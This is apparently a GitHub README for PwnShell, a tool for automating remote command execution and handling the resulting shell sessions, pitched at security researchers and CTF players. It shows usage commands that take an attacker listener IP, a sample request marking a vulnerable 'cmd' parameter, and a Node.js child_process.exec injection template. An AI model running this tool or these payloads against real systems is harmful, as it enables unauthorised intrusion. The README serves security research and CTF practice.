

# PwnShell

**PwnShell** is a powerfull RCE exploitation Automator and a Session handler tool designed for Security Researchers and CTF players.
![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/PwnShell.png)

<details open="open">
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#getting-started">Installation</a>
    </li>
    <li><a href="#usage">Usage</a></li>
    <li><a href="#license">License</a></li>
    <li><a href="#contact">Contact</a></li>
    <li><a href="#acknowledgements">Acknowledgements</a></li>
  </ol>
</details>

## Installation

1. Clone the repo
   ```sh
   git clone https://github.com/zAbuQasem/PwnShell
   ```
2. Install the dependencies
   ```sh
   pip install -r requirements.txt
   ```
3. Make the script executable 
   ```sh
   cd PwnShell/
   chmod +x pwnshell.py
   ```



<!-- USAGE EXAMPLES -->
## Usage
### Recommended Method 👇
```sh
   ./pwnshell.py -H [HOST IP] -f [REQUEST FILE]
```
#### Request File Example:
###### Put 'PWNME' in the vulnerable place.
```sh
GET /Vulnerable.php?cmd=PWNME HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```
### OR
##### Note: Cookie and headers must be in JSON format (if provided).
```sh
./pwnshell.py -H [HOST-IP] -u [TARGET-URL] -m [REQUEST-METHOD] -c [COOKIE (optional)] -k [HEADERS (optional)]
   ```
   ```sh
   ./pwnshell.py -H <HOST-IP> -u http/s://<TARGET>/Vulnerable.php?cmd=PWNME -m get 
   ```

### For NodeJs Payloads 
###### To use only NodeJs payload -> require('child_process').exec('PWNME')
```shell
  ./pwnshell.py -H [HOST-IP] -n   
```

### Use Help for full usage details
```sh
   ./pwnshell.py -h
   ```

# Preview
## Using [Request File]
![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/requestfile-demo.gif)

## Using [URL]
![Alt text](https://github.com/zAbuQasem/PwnShell/blob/main/Screenshots/url-demo.gif)
   


## License

Distributed under the MIT License. See `LICENSE` for more information.



<!-- CONTACT -->
## Contact

**Zeyad AbuQasem** - [LinkedIn](https://www.linkedin.com/in/zeyad-yahya-0985971b5/)

**Omar Albalouli** - [LinkedIn](https://www.linkedin.com/in/omar-albalouli/)

**Project Link**: [https://github.com/zAbuQasem/PwnShell](https://github.com/zAbuQasem/PwnShell)



<!-- ACKNOWLEDGEMENTS -->
## Acknowledgements
* [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
* [Docker Privesc Script](https://github.com/flast101/docker-privesc)
* [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
* [Burpee](https://github.com/xscorp/Burpee)




[license-url]: https://github.com/zAbuQasem/PwnShell/blob/master/LICENSE.txt
[product-screenshot]: images/screenshot.png
